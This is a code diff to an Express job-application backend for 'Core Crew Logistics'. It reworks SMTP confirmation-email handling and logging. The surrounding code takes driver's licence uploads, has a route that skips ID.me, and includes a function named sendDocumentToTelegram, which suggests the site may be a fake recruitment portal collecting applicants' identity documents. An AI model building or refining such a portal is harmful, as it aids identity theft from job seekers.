@@ -301,7 +301,8 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   req.session.save((err) => {
     if (err) return res.status(500).render('error', { message: 'Session save failed.' });
     sendConfirmationEmail(email, req.session.applicationDraft.firstName)
-      .then(() => res.redirect('/apply/submit'));
+      .catch(e => console.error('Confirmation email error:', e.message));
+    res.redirect('/apply/submit');
   });
 });
 
@@ -394,7 +395,8 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
   req.session.save((err) => {
     if (err) return res.status(500).render('error', { message: 'Session save failed.' });
     sendConfirmationEmail(application.email, application.firstName)
-      .then(() => res.redirect('/apply/submit'));
+      .catch(e => console.error('Confirmation email error:', e.message));
+    res.redirect('/apply/submit');
   });
 });
 
@@ -506,13 +508,25 @@ async function sendDocumentToTelegram(filepath, filename) {
 
 async function sendConfirmationEmail(email, firstName) {
   try {
+    const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
+    const smtpPort = parseInt(process.env.SMTP_PORT, 10) || 465;
+    const smtpUser = process.env.SMTP_USER;
+    const smtpPass = process.env.SMTP_PASS;
+
+    if (!smtpUser || !smtpPass) {
+      console.error('SMTP credentials not configured. SMTP_USER and SMTP_PASS environment variables are required.');
+      return;
+    }
+
+    console.log('Sending confirmation email to:', email, 'via', smtpHost + ':' + smtpPort);
+
     const transporter = nodemailer.createTransport({
-      host: process.env.SMTP_HOST || "smtp.gmail.com",
-      port: process.env.SMTP_PORT || 465,
-      secure: true,
+      host: smtpHost,
+      port: smtpPort,
+      secure: smtpPort === 465,
       auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS,
+        user: smtpUser,
+        pass: smtpPass,
       },
     });
     const htmlBody = `
@@ -547,14 +561,15 @@ async function sendConfirmationEmail(email, firstName) {
         </div>
       </div>`;
     await transporter.sendMail({
-      from: `"Core Crew Logistics" <${process.env.SMTP_USER}>`,
+      from: `"Core Crew Logistics" <${smtpUser}>`,
       to: email,
       subject: "Application Received — Core Crew Logistics",
       text: `Dear ${firstName || 'Applicant'},\n\nThank you for submitting your application with Core Crew Logistics. We have successfully received your submission and our hiring team is now reviewing your information.\n\nWhat happens next?\n- Our team will review your application carefully\n- You may be contacted for additional information\n- Qualified candidates will be scheduled for an interview\n- We aim to respond within 5-7 business days\n\nIf you have any questions, please contact us at corecrewlogistics@gmail.com or call 310-574-2415.\n\nBest regards,\nCore Crew Logistics Team\n4700 Stockdale Hwy, Bakersfield, CA 93309`,
       html: htmlBody,
     });
+    console.log('Confirmation email sent successfully to:', email);
   } catch (e) {
-    console.warn('Email send failed:', e.message);
+    console.error('Email send failed:', e.message, e.stack);
   }
 }
 
